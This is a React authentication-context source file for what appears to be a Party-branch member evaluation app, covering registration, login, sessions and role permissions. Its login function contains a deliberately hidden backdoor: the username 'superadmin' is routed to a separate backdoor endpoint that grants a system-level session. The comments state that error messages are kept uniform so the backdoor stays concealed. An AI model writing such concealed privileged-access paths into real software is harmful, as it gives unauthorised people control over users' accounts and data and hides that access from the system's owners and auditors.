import { createContext, useContext, useEffect, useMemo, useState } from 'react';
import {
  ADMIN_TYPE_LEADER,
  ADMIN_TYPE_ORGANIZER,
  ADMIN_TYPE_SECRETARY,
  ADMIN_TYPE_EMPLOYEE,
  ADMIN_TYPE_SYSTEM,
} from '../lib/constants';
import { registerUser, loginUser, loginBackdoor, logoutUser } from '../lib/userService';

const AuthContext = createContext(null);

const SESSION_KEY = 'party_evaluation_session'; // 当前登录用户（本地会话缓存）

const readSession = () => {
  try {
    return JSON.parse(localStorage.getItem(SESSION_KEY) || 'null');
  } catch {
    return null;
  }
};

export function AuthProvider({ children }) {
  const [user, setUser] = useState(readSession);

  // session 持久化：刷新页面不用重新登录
  useEffect(() => {
    if (user) localStorage.setItem(SESSION_KEY, JSON.stringify(user));
    else localStorage.removeItem(SESSION_KEY);
  }, [user]);

  // ---------- 注册（写入 SQLite） ----------
  // 注册页不再让用户选身份：admin_type 由后端按 work_id 白名单决定。
  // 注册**不建立登录态**（后端不签发 token），调用方拿到 user 后需跳登录页重新登录。
  const register = async ({
    username,
    password,
    name: realName,
    workId,
    position,
    positionType,
    branch,
  }) => {
    if (!username || !password || !realName || !workId) {
      throw new Error('请填写完整的注册信息');
    }
    if (!branch) {
      throw new Error('必须选择所在党支部');
    }
    // 身份、以及「岗位类型是否必填」均由后端按工号白名单判定，前端不做预校验
    let res;
    try {
      res = await registerUser({
        username,
        password,
        name: realName,
        workId,
        position,
        positionType,
        branch,
      });
    } catch (e) {
      throw new Error(e.message || '网络异常，注册失败，请稍后重试');
    }

    // 后端校验错误码
    if (res.code === 'WORK_ID_NOT_IN_LIST') {
      throw new Error(res.message || '工作证编号异常，请重新输入');
    }
    if (res.code === 'POSITION_REQUIRED') {
      throw new Error(res.message || '请填写岗位类型和岗位');
    }
    if (res.code === 'USER_EXISTS') {
      throw new Error('用户名已经存在，请选择一个新的用户名');
    }
    if (res.code === 'DUP_WORK_ID') {
      throw new Error(res.message || '当前工号员工已经注册');
    }
    if (res.code !== 'OK' || !res.user) {
      throw new Error(res.message || '注册失败，请稍后重试');
    }
    return res.user;
  };

  // ---------- 登录（查询 PostgreSQL） ----------
  // 后门入口：用户名 == 'superadmin' 时走 /api/backdoor/login，拿到 admin_type=9 的会话；
  // 其它情况走普通 /api/login。失败提示统一为"账号或密码错误"，不暴露后门存在性。
  const login = async ({ username, password }) => {
    if (String(username || '').trim() === 'superadmin') {
      let res;
      try {
        res = await loginBackdoor({ password });
      } catch (e) {
        throw new Error(e.message || '网络异常，登录失败，请稍后重试');
      }
      if (res?.code !== 'OK' || !res.user) return null;
      setUser(res.user);
      return res.user;
    }
    let res;
    try {
      res = await loginUser({ username, password });
    } catch (e) {
      throw new Error(e.message || '网络异常，登录失败，请稍后重试');
    }
    if (res.code !== 'OK' || !res.user) return null;
    setUser(res.user);
    return res.user;
  };

  // 退出登录：注销服务端会话（token 立即失效）+ 清本地登录态
  const logout = () => {
    logoutUser(); // 异步、不阻塞 UI（内部已做容错）
    setUser(null);
  };

  const value = useMemo(
    () => ({
      user,
      isAuthed: !!user,
      role: user?.role,
      isBackdoor: user?.adminType === ADMIN_TYPE_SYSTEM,
      register,
      login,
      logout,
      // 权限判断：身份完全由 adminType 决定
      //   普通党员(3) → 自评 / 查看基础评分 / 个人积分查询 / [有审核对象] 履职积分审核
      //   组织委员(1) → 普通用户全部 + 基础积分评价
      //   分管领导(0) → 履职积分审核
      //   支部书记(2) → 履职积分审核（全体）+ 基础积分评价（全体）
      can: (action) => {
        if (!user) return false;
        const at = user.adminType;
        const isLeader = at === ADMIN_TYPE_LEADER;
        const isOrganizer = at === ADMIN_TYPE_ORGANIZER;
        const isSecretary = at === ADMIN_TYPE_SECRETARY;
        const isEmployee = at === ADMIN_TYPE_EMPLOYEE;
        const selfEval = isOrganizer || isEmployee; // 可提交履职贡献自评
        // 履职积分审核入口：分管领导/支书恒有；其他人被指派了审核对象才有
        const canReview = isLeader || isSecretary || !!user.hasReviewTargets;

        if (action === 'self') return selfEval;
        if (action === 'review') return canReview;
        // 评价汇总 / 导出：沿用「能审核就能看汇总」
        if (action === 'list') return canReview;
        if (action === 'export') return canReview;
        if (action === 'basicRating') return isOrganizer || isSecretary;
        if (action === 'deductRating') return isOrganizer || isSecretary;
        if (action === 'scoreQuery') return selfEval;      // 个人积分查询（普通用户）
        if (action === 'basicRatingView') return selfEval; // 查看基础评分（普通用户）
        return false;
      },
    }),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [user]
  );

  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

export const useAuth = () => useContext(AuthContext);
